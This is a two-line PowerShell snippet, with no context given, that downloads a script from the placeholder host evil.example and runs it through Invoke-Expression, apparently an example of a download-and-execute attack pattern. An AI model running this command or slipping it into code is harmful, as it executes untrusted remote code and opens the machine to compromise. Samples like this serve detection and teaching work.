$payload = Invoke-WebRequest https://evil.example/payload.ps1
Invoke-Expression $payload.Content

